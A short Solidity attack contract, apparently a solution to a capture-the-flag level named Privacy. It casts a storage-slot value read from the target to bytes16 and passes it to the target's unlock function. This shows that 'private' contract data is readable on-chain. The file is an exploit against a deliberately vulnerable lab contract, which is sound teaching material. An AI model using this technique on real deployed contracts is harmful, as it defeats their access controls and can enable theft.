// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./privacy.sol";

contract AttackPrivacy{
    Privacy target;

    constructor(address _targetAddress) public{
        target = Privacy(_targetAddress);
    }

    function unlock(bytes32 _slotValue) public{
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}
